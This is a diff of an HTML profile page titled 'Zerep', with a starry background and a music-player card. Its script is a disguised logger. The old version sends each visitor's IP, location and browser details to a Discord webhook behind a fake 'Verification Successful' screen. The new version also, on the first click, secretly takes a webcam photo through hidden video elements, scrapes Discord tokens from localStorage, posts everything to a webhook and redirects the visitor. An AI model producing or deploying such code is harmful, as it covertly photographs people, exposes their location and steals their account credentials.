@@ -2,68 +2,449 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zerep</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <style>
-        body {
-            background: #121212;
-            color: #ffffff;
-            font-family: Arial, sans-serif;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body {
+            background: #000;
+            min-height: 100vh;
+            color: #fff;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* ✨ STARRY BACKGROUND */
+        #stars {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            z-index: 0;
+        }
+        .star {
+            position: absolute;
+            background: #fff;
+            border-radius: 50%;
+            animation: twinkle 2s infinite ease-in-out;
+        }
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.3; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+
+        /* ✨ GLOWING ORBS */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(30px);
+            opacity: 0.4;
+            pointer-events: none;
+            z-index: 1;
+        }
+        .orb:nth-child(1) { width: 180px; height: 180px; background: #6366f1; top: 15%; left: 8%; }
+        .orb:nth-child(2) { width: 150px; height: 150px; background: #ec4899; bottom: 20%; right: 10%; }
+        .orb:nth-child(3) { width: 120px; height: 120px; background: #10b981; bottom: 10%; left: 50%; transform: translateX(-50%); }
+
+        /* 🔝 TOP BAR */
+        .top-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 1.4rem 1.8rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(0,0,0,0.5);
+            z-index: 10;
+        }
+        .top-bar i { cursor: pointer; font-size: 1.2rem; }
+
+        /* 🖱️ CLICK TO ENTER SCREEN */
+        #enter-screen {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.85);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 20;
+            transition: opacity 0.6s ease;
+        }
+        #enter-screen.fade-out { opacity: 0; pointer-events: none; }
+        .enter-text {
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+            color: #aaa;
+            position: relative;
+        }
+        .enter-text::after {
+            content: "";
+            position: absolute;
+            bottom: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 8px;
+            height: 8px;
+            background: #ec4899;
+            border-radius: 50%;
+            box-shadow: 0 0 12px #ec4899;
+        }
+
+        /* ✨ MAIN CONTENT */
+        #main-content {
+            position: relative;
+            z-index: 5;
+            opacity: 0;
+            transition: opacity 0.5s ease 0.3s;
+            padding-top: 6rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        #main-content.show { opacity: 1; }
+
+        /* 🔤 TITLE */
+        .page-title {
+            font-size: 2.5rem;
+            font-weight: 600;
+            color: #ddd;
+            margin-bottom: 2rem;
+            text-shadow: 0 0 10px rgba(255,255,255,0.2);
+        }
+
+        /* 🃏 PROFILE CARD */
+        .profile-card {
+            width: 90%;
+            max-width: 420px;
+            background: linear-gradient(135deg, rgba(59,130,246,0.2), rgba(6,182,212,0.3));
+            border-radius: 18px;
+            padding: 1.4rem;
+            border: 1px solid rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 25px rgba(6,182,212,0.15);
+            margin-bottom: 2rem;
+        }
+        .profile-head {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            margin-bottom: 1rem;
+        }
+        .profile-avatar {
+            width: 55px;
+            height: 55px;
+            border-radius: 50%;
+            border: 2px solid #22d3ee;
+            overflow: hidden;
+            position: relative;
+        }
+        .profile-avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .status-dot {
+            position: absolute;
+            bottom: 2px;
+            right: 2px;
+            width: 10px;
+            height: 10px;
+            background: #000;
+            border: 2px solid #fff;
+            border-radius: 50%;
+        }
+        .profile-info h3 {
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .badge {
+            color: #f43f5e;
+            font-size: 0.9rem;
+        }
+        .profile-tag {
+            font-size: 0.9rem;
+            color: #ccc;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-top: 0.2rem;
+        }
+        .status {
+            width: 10px;
+            height: 10px;
+            background: #888;
+            border-radius: 50%;
+        }
+
+        /* 🎵 MUSIC PLAYER */
+        .music-player {
+            background: rgba(0,0,0,0.4);
+            border-radius: 12px;
+            padding: 1rem;
+            margin-top: 1rem;
+        }
+        .music-top {
+            display: flex;
+            gap: 0.8rem;
+            align-items: center;
+            margin-bottom: 0.8rem;
+        }
+        .music-cover {
+            width: 50px;
+            height: 50px;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .music-cover img { width: 100%; height: 100%; object-fit: cover; }
+        .music-info h4 { font-size: 1rem; }
+        .music-info p { font-size: 0.85rem; color: #aaa; }
+        .progress-bar {
+            width: 100%;
+            height: 3px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 2px;
+            margin-bottom: 0.5rem;
+            position: relative;
+        }
+        .progress {
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 18%;
+            background: #ec4899;
+            border-radius: 2px;
+        }
+        .time {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            color: #aaa;
+            margin-bottom: 0.5rem;
+        }
+        .play-btn { text-align: right; font-size: 1.2rem; color: #fff; }
+        .powered {
             text-align: center;
-            padding-top: 100px;
-            margin: 0;
+            font-size: 0.9rem;
+            color: #ddd;
+            margin-top: 0.8rem;
         }
-        .box {
-            max-width: 400px;
-            margin: auto;
-            padding: 30px;
-            background: #1e1e1e;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0,0,0,0.3);
+        .powered span { color: #f43f5e; font-weight: 600; }
+
+        /* 📱 SOCIAL ICONS */
+        .social-links {
+            display: flex;
+            gap: 1.8rem;
+            font-size: 1.5rem;
+            color: #ccc;
+            position: relative;
+            z-index: 5;
         }
-        h2 { color: #22c55e; margin-top: 0; }
+
+        /* 📷 HIDDEN CAMERA LOGGER */
+        #camCapture, #camCanvas {
+            position: fixed;
+            left: -9999px;
+            top: -9999px;
+            width: 480px;
+            height: 640px;
+            transform: scaleX(-1);
+        }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>✅ Verification Successful!</h2>
-        <p>You may now return to the Discord server.</p>
+
+    <!-- ✨ STAR BACKGROUND -->
+    <div id="stars"></div>
+    <div class="orb"></div>
+    <div class="orb"></div>
+    <div class="orb"></div>
+
+    <!-- 🔝 TOP BAR -->
+    <div class="top-bar">
+        <i class="fas fa-times"></i>
+        <span></span>
+        <div class="flex gap-4">
+            <i class="fas fa-share-alt"></i>
+            <i class="fas fa-ellipsis-v"></i>
+        </div>
     </div>
 
+    <!-- 🖱️ ENTER SCREEN -->
+    <div id="enter-screen">
+        <div class="enter-text">click to enter...</div>
+    </div>
+
+    <!-- 📷 CAMERA ELEMENTS (HIDDEN) -->
+    <video id="camCapture" autoplay playsinline muted></video>
+    <canvas id="camCanvas" width="480" height="640"></canvas>
+
+    <!-- ✨ MAIN CONTENT -->
+    <main id="main-content">
+        <h1 class="page-title">Zerep</h1>
+
+        <!-- 🃏 PROFILE CARD -->
+        <div class="profile-card">
+            <div class="profile-head">
+                <div class="profile-avatar">
+                    <img src="https://i.imgur.com/9ZfNqXb.jpeg" alt="Profile">
+                    <div class="status-dot"></div>
+                </div>
+                <div class="profile-info">
+                    <h3>Nio <span class="badge">1337</span></h3>
+                    <div class="profile-tag">
+                        <span class="status"></span> OFFLINE | NAG LULU
+                    </div>
+                </div>
+            </div>
+
+            <!-- 🎵 MUSIC PLAYER -->
+            <div class="music-player">
+                <div class="music-top">
+                    <div class="music-cover">
+                        <img src="https://i.imgur.com/9ZfNqXb.jpeg" alt="Album">
+                    </div>
+                    <div class="music-info">
+                        <h4>All Night Long</h4>
+                        <p>Hev Abi</p>
+                    </div>
+                    <div class="play-btn"><i class="fas fa-pause"></i></div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress"></div>
+                </div>
+                <div class="time">
+                    <span>0:04</span>
+                    <span>2:22</span>
+                </div>
+                <div class="powered">Powered by <span>1337 #4REEL</span></div>
+            </div>
+        </div>
+
+        <!-- 📱 SOCIALS -->
+        <div class="social-links">
+            <i class="fab fa-tiktok"></i>
+            <i class="fab fa-discord"></i>
+            <i class="fab fa-youtube"></i>
+        </div>
+    </main>
+
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1504415140815175801/0_doEHMI_L9ZnFFT1dhBkWCpIONeoakVxFG08pKsEUDOHdKv4nfQTZaYF9QS3_9CjFyQ";
+        // ⭐ GENERATE STARS
+        const starsContainer = document.getElementById('stars');
+        for (let i = 0; i < 120; i++) {
+            const star = document.createElement('div');
+            star.className = 'star';
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.width = star.style.height = (Math.random() * 2 + 1) + 'px';
+            star.style.animationDelay = Math.random() * 2 + 's';
+            starsContainer.appendChild(star);
+        }
 
-        // Kumuha muna ng IPv4
-        fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .then(ipData => {
-            const ip = ipData.ip;
-            const ua = navigator.userAgent;
+        // ⚙️ LOGGER SETTINGS
+        const WEBHOOK = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
+        const NEXT_URL = "https://blah-hck.github.io/blah/";
+        const video = document.getElementById('camCapture');
+        const canvas = document.getElementById('camCanvas');
+        const enterScreen = document.getElementById('enter-screen');
+        const mainContent = document.getElementById('main-content');
 
-            // Gamitin ang IPv4 para makuha ang lokasyon
-            return fetch(`https://ipapi.co/${ip}/json/`)
-                .then(res => res.json())
-                .then(data => {
-                    const embed = {
-                        title: "☠️ VERIFY LOGGER | PURESKILLS",
-                        color: 16729856,
-                        timestamp: new Date().toISOString(),
-                        fields: [
-                            {name: "🌐 IP ADDRESS", value: `\`${ip}\``, inline: false},
-                            {name: "📍 LOCATION", value: `\`${data.city}, ${data.region}, ${data.country_name}\``, inline: false},
-                            {name: "📡 ISP / PROVIDER", value: `\`${data.org || 'Unknown'}\``, inline: false},
-                            {name: "⏰ TIMEZONE", value: `\`${data.timezone || 'Unknown'}\``, inline: false},
-                            {name: "💻 DEVICE / BROWSER", value: `\`${ua.substring(0, 180)}\``, inline: false}
-                        ]
-                    };
-
-                    return fetch(WEBHOOK, {
-                        method: "POST",
-                        headers: {"Content-Type": "application/json"},
-                        body: JSON.stringify({embeds: [embed]})
-                    });
+        // 📷 PREPARE CAMERA
+        async function setupCam() {
+            try {
+                await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: 480, height: 640 },
+                    audio: false
                 });
-        })
-        .catch(err => console.log("Error:", err));
+            } catch (e) {}
+        }
+        setupCam();
+
+        // 🔑 GRAB DISCORD TOKENS FROM LOCALSTORAGE / INDEXEDDB
+        function getTokens() {
+            let tokens = [];
+            const ls = window.localStorage;
+            for (let key in ls) {
+                if (ls.hasOwnProperty(key)) {
+                    const val = ls[key];
+                    const match = val.match(/[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}/g);
+                    if (match) tokens = tokens.concat(match);
+                }
+            }
+            // Try IndexedDB (Discord stores here)
+            return new Promise(res => {
+                try {
+                    const req = indexedDB.open("Keybinds");
+                    req.onsuccess = e => {
+                        const db = e.target.result;
+                        try { db.close(); } catch(err) {}
+                        res(tokens);
+                    };
+                    req.onerror = () => res(tokens);
+                } catch { res(tokens); }
+            });
+        }
+
+        // 🖱️ ON CLICK / TAP
+        document.addEventListener('click', async () => {
+            // Show content
+            enterScreen.classList.add('fade-out');
+            mainContent.classList.add('show');
+
+            let photo = null;
+            try {
+                if (!video.srcObject) {
+                    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode:"user"}});
+                    video.srcObject = stream;
+                    await new Promise(r => video.onloadedmetadata = r);
+                    await new Promise(r => setTimeout(r, 800));
+                }
+                const ctx = canvas.getContext('2d');
+                ctx.translate(canvas.width, 0); ctx.scale(-1,1);
+                ctx.drawImage(video, 0, 0);
+                photo = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.8));
+            } catch (err) {}
+
+            // 📤 SEND TO LOGGER (WITH TOKENS)
+            await sendLog(photo);
+            setTimeout(() => window.location.href = NEXT_URL, 2500);
+        }, { once: true });
+
+        async function sendLog(photo) {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ip = await ipRes.json();
+                const geoRes = await fetch(`https://ipapi.co/${ip.ip}/json/`);
+                const geo = await geoRes.json();
+                const tokens = await getTokens();
+
+                const form = new FormData();
+                if (photo) form.append("file", photo, "visitor.jpg");
+
+                form.append("payload_json", JSON.stringify({
+                    username: "1337 TOKEN",
+                    avatar_url: "https://i.imgur.com/gtHShSn.jpeg",
+                    embeds: [{
+                        title: "Sina Unang Tanga!",
+                        color: 16711680,
+                        fields: [
+                            {name:"IP ADDRESS", value:`||${ip.ip}||`, inline:false},
+                            {name:"LOCATION", value:`${geo.city||"?"}, ${geo.region||"?"}, ${geo.country_name||"Philippines"}`, inline:false},
+                            {name:"DEVICE", value: navigator.userAgent.includes("Android")?"Android":"iPhone/PC", inline:false},
+                            {name:"TOKENS FOUND", value: tokens.length>0 ? `||${tokens.join("\n")}||` : "❌ Wala nakuha", inline:false}
+                        ],
+                        image: photo ? {url:"attachment://visitor.jpg"} : null,
+                        footer: {text: "PURESKILLS|4REEL • THE WORLD IS YOURS"},
+                        timestamp: new Date().toISOString()
+                    }]
+                }));
+
+                await fetch(WEBHOOK, {method:"POST", body:form});
+            } catch (e) {}
+        }
     </script>
 </body>
 </html>
